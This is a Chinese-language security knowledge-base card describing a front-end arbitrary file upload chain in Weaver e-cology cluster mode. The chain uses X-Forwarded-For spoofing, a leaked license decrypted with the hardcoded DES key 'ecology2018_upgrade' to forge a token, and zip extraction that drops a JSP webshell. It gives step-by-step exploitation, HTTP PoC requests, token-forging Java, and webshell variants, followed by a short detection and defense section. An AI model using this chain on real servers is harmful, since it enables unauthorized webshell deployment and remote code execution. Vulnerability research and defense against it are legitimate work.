---
id: web-java-component-weaver-ecology-clusterupgrade-upload-jsp-webshell
title: 泛微 e-cology 集群模式前台任意文件上传：X-Forwarded-For 绕过 IP 校验 + tokenCheck.jsp 泄漏 license 伪造 token + 补丁包 ZIP 解压 JSP 落盘
type: scenario
domain: web
path: web/java/component
technique: weaver-ecology-clusterupgrade-upload-jsp-webshell
tags:
- java
- weaver
- ecology
- oa
- file-upload
- zip
- jsp
- webshell
- cluster
- token
- des
- x-forwarded-for
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V686
  verified_at: '2026-11-13T16:13:45+08:00'
  notes: 已通读content.md并逐张核对全部16图：01 10.58.3 补丁 forbidden URL XML 把 clusterNodeOperation/clusterSettingOperation/clusterUpgrade/uploadFileClient/uploadFileServer 列入 need-check；02 clusterUpgrade.jsp checkSecurity 后仍调用 UploadHandle.upload；03 checkSecurity 先 checkIp 再校验 token；04 checkIp 读 weaver.properties 的 MainControlIP 与 getIp 比较；05 getIp 调 request.getRemoteAddr；06 重写的取 IP 逻辑按 RemoteIp/x-forwarded-for/Proxy-Client-IP 头取值（XFF 伪造 MainControlIP 成立）；07 checkSecurity(token) 反射加载 weaver.upgradetool.upgrade.CheckSecurity.check，异常返回 true；08 CheckSecurity.check 查 license 表、DesUtils(license).getDistributeinfo、encrypt("wEAVer2018"+distributeinfo) 与 token 比较；09 tokenCheck.jsp 用硬编码 key ecology2018_upgrade 加密 license 并输出 timestamp/key；10 实际响应 timestamp=2020-03-17 12:57:38.487 及 key；11 UploadHandle.upload 二次 checkSecurity、getUploadSysFilePath4cluster；12 仅 endsWith("zip") 校验；13 POST 上传 123.zip（内含 123.jsp）；14 触发升级请求 200；15 访问 /versionupgrade/temp/123.jsp 返回 123.txt；16 nuclei 命中 /clusterupgrade/uploadFileClient.jsp。卡内
    XFF 绕过、tokenCheck.jsp 泄漏 license 伪造 token、zip 补丁包解压 JSP 落盘三条细节均与截图一致。版本：原文仅说明 10.58.3 补丁修复、未给明确受影响区间，卡片未写 affected_versions（正确，正文按'10.58.3 之前'表述属补丁边界推断）。dedup除自身exact外，top候选均为泛微其他入口（MVEL 0.887、mobilemode token 链 0.896、jdbc-socketfactory 0.892、XStream WorkflowServiceXml 0.885、DataConn H2 0.884 等），非同链，库内无 clusterupgrade/tokenCheck.jsp 既有卡，无重复可删。未实机复现；frontmatter无sources/source_url。
url: /docs/web/java/component/web-java-component-weaver-ecology-clusterupgrade-upload-jsp-webshell/
draft: false
kb_aliases:
- 泛微 ecology 集群上传
- clusterUpgrade.jsp 任意文件上传
- uploadFileClient.jsp 上传
- tokenCheck.jsp license 泄漏
- ecology2018_upgrade DES key
- MainControlIP X-Forwarded-For 绕过
- 泛微 10.58.3 补丁
---

## 一句话结论

泛微 e-cology 开启集群模式时，集群补丁上传接口 `uploadFileClient.jsp`（与 `clusterUpgrade.jsp` 共用上传逻辑）允许把 zip 补丁包写入 `WEB-INF/versionupgrade/upload`，随后 `clusterUpgrade.jsp` 的升级动作会把该 zip 解压到 web 可访问的 `versionupgrade/temp` 且不限制 JSP；配合 `X-Forwarded-For` 伪造 `MainControlIP` 绕过 IP 校验、以及 `tokenCheck.jsp` 用硬编码 DES key `ecology2018_upgrade` 回显加密 license 来伪造 token，可从前台直接落地 JSP webshell。

## 原理

- **补丁面**：10.58.3 与 10.58.2 的差异里新增 `WEB-INF/securityRule/Rule/weaver_security_common_forbidden_url_20230724.xml`，把 `/clusterupgrade/clusterUpgrade.jsp`、`uploadFileClient.jsp`、`uploadFileServer.jsp`、`clusterNodeOperation.jsp`、`clusterSettingOperation.jsp` 列为 need-check URL，说明漏洞就在这些集群升级接口上。`uploadFileServer.jsp` 需要用户信息，`uploadFileClient.jsp` 与 `clusterUpgrade.jsp` 共用上传逻辑。
- **IP 校验可绕过**：`checkSecurity(token, request)` 先 `checkIp(request)`。`checkIp` 在 category 为 `ecology` 时读取 `weaver.properties` 的 `MainControlIP`，要求请求 IP 与之相等；而 `getIp` 调用的 `request.getRemoteAddr()` 在 ecology 中被重写为从 `X-Forwarded-For`（以及 RemoteIp/Proxy-Client-IP 等头）取真实 IP。攻击者把 `X-Forwarded-For` 设为 `MainControlIP` 即可通过。该条件是漏洞“鸡肋”之处：默认安装不配置 `MainControlIP`，必须目标处于集群模式。
- **token 校验与伪造**：`checkSecurity(token)` 反射加载 `weaver.upgradetool.upgrade.CheckSecurity` 并调用 `check(token)`；异常时返回 true（fail-open）。`CheckSecurity.check` 从数据库 `license` 表取 license 作为 DES key，计算 `token = DesUtils(license).encrypt("wEAVer2018" + distributeInfo)` 后与请求 token 比较，license 无法直接猜。
- **license 泄漏**：`tokenCheck.jsp` 取同一 license 并用硬编码 DES key `"ecology2018_upgrade"` 加密后输出 JSON：`{"timestamp":"<getDistributeinfo()>","key":"<DES_encrypt(license, ecology2018_upgrade)>"}`。攻击者用硬编码 key 解密 `key` 得到 license，结合 `timestamp` 字段（即 getDistributeinfo 值）就能按上面的公式伪造 token。
- **上传与解压落地**：`UploadHandle.upload` 再次 `checkSecurity`，通过后把上传文件拷贝到 `GCONSTUClient.getUploadSysFilePath4cluster()`（原文环境 `C:\WEAVER\ecology\WEB-INF\versionupgrade\upload`），文件名必须以 `zip` 结尾（否则“补丁包格式不规范”）。之后 `clusterUpgrade.jsp` 的 upgrade 会把该目录下的压缩包解压到 `C:\WEAVER\ecology\versionupgrade\temp`，对包内文件后缀不限制，JSP 落在 web 根下的 `versionupgrade/temp/` 可直接访问执行。
- **为什么成立**：补丁包上传本应只接受官方签名包，但代码只校验 zip 后缀、目录与 token/IP；license 又被另一个 JSP 以硬编码 key 泄漏，导致整套“集群节点认证”可被离线伪造；解压目录在 web 可访问路径且不限制脚本后缀，最终形成任意 JSP 上传。

## 触发条件

- 目标为泛微 e-cology 10.58.3 之前的版本（10.58.3 补丁禁用上述 URI），且开启了集群模式、`weaver.properties` 配置了 `MainControlIP`。
- `tokenCheck.jsp` 可访问（用于泄漏 license 与 distributeinfo），或攻击者已通过其他方式获得 license。
- 集群接口可从攻击者位置访问；请求可设置 `X-Forwarded-For`（反向代理/网关透传该头）。
- `versionupgrade/temp` 目录位于 web 根下且容器解析 JSP（默认如此）。

## 利用步骤

1. 访问 `tokenCheck.jsp` 获取 `{"timestamp":"<distributeinfo>","key":"<DES(license, ecology2018_upgrade)>"}`。
2. 用硬编码 key `ecology2018_upgrade` 解密 `key` 得 license，按 `DES(license).encrypt("wEAVer2018" + timestamp)` 计算 token。
3. 构造含 `123.jsp` 的 `123.zip`，向 `/clusterupgrade/uploadFileClient.jsp?token=<token>` 发 multipart 上传，请求头带 `X-Forwarded-For: <MainControlIP>`，文件名为 `123.zip`。
4. 调用 `clusterUpgrade.jsp` 的升级/解压动作，把 zip 解压到 `versionupgrade/temp`。
5. 访问 `/versionupgrade/temp/123.jsp` 验证 webshell（原文截图返回 `123.txt` 内容）。
6. 失败排查：是否集群模式/`MainControlIP` 配置、XFF 是否被代理覆盖、token 计算是否用了正确的 license 与 distributeinfo、补丁是否已到 10.58.3。

## PoC

```http
GET /clusterupgrade/tokenCheck.jsp?token=x HTTP/1.1
Host: target
```

```json
{"timestamp":"<distributeinfo>","key":"<DES_encrypt(license, ecology2018_upgrade)>"}
```

token 计算（等价逻辑）：

```java
String license = desDecrypt(ecology2018_upgrade, leakedKey);
String token = new DesUtils(license).encrypt("wEAVer2018" + distributeinfo);
```

```http
POST /clusterupgrade/uploadFileClient.jsp?token=<token> HTTP/1.1
Host: target
X-Forwarded-For: <MainControlIP>
Content-Type: multipart/form-data; boundary=----b

------b
Content-Disposition: form-data; name="file"; filename="123.zip"
Content-Type: application/zip

<zip 内含 123.jsp>
------b--
```

触发升级解压后访问：

```http
GET /versionupgrade/temp/123.jsp HTTP/1.1
Host: target
```

## 变体与关联

- [[web-java-component-weaver-ecology-bshservlet-invoker-rce]]、[[web-java-component-weaver-ecology-jdbc-socketfactory-memshell]]、[[web-java-component-weaver-ecology10-dataconn-jdbc-h2-init-rce]]：泛微 e-cology 其他入口/利用链，可结合本卡的 JSP 落点做内存马或命令通道。
- 同类“上传 zip 后由升级/导入功能解压”模式：可参考 zipslip/补丁包解压类卡片；本卡的关键是认证链（XFF + license 泄漏）而非解压算法。
- 变体：把 JSP 换成冰蝎/哥斯拉马或内存马加载器；利用 `versionupgrade/temp` 可写做持久化；若解压路径可穿越，可进一步扩大落点。
- 检测侧对应 nuclei 模板 `ecology-oa-clusterupgrade-upload`（命中 `/clusterupgrade/uploadFileClient.jsp`）。

## 检测与防御

- 检测：访问 `/clusterupgrade/uploadFileClient.jsp`、`/clusterupgrade/clusterUpgrade.jsp`、`/clusterupgrade/tokenCheck.jsp` 的请求；`X-Forwarded-For` 指向内网主节点 IP 的集群接口访问；`versionupgrade/temp` 下出现 `.jsp` 文件或被访问；zip 上传后紧跟解压与 JSP 访问的日志序列。
- 防御：升级到官方 10.58.3 及以上；按补丁把集群相关 URI 加入 forbidden URL；非必要不开启集群模式，开启时确保 `MainControlIP` 不被外部伪造、代理层清洗 `X-Forwarded-For`；删除/限制 `tokenCheck.jsp` 访问；对 `versionupgrade`、`WEB-INF/versionupgrade/upload` 做目录权限与文件完整性监控；WAF 拦截 zip 包内 JSP 与 temp 目录脚本访问。
